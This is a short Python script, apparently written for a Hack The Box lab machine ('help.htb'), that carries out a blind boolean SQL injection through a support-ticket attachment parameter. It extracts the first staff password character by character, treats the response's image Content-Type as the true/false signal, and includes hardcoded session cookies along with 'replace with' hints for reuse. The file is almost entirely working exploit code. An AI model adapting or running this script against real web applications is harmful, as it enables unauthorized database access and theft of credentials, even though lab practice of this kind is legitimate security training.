import requests
print("\n\t")
def blindInject(query):
	url = f"http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=2&param[]=7 {query}" # replace with web sql suspected query
	cookies={'PHPSESSID':'e8a8cmsjtg6m0hhc0sslf9o5d7', 'usrhash':'0Nwx5jIdx+P2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ/iYFsjV6wVnLIF/aNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo+FAhGVCYTqcPYcy8q6zq5GBnNHg3al2t1kkNhgI/YWSgg=='} # replace with working cookie
	response=requests.get(url, cookies=cookies)
	rContentType = response.headers["Content-Type"]
	#print(response.content)
	if rContentType == 'image/jpeg':								# replace with 'image/jpg' if req'ed, depending on returned page - since this is a flag of char being correct or not
		return True
	else:
		return False
	
keyspace='abcdefghijklmnopqrstuvwxyz0123456789'

for i in range(0,41):
	for char in keyspace:
		inject=f"and substr((select password from staff limit 0,1),{i},1) = '{char}'"	#select 1st char from password, test if a char from our keyspace
		if blindInject(inject):
			print(char, end='', flush=True)
			break
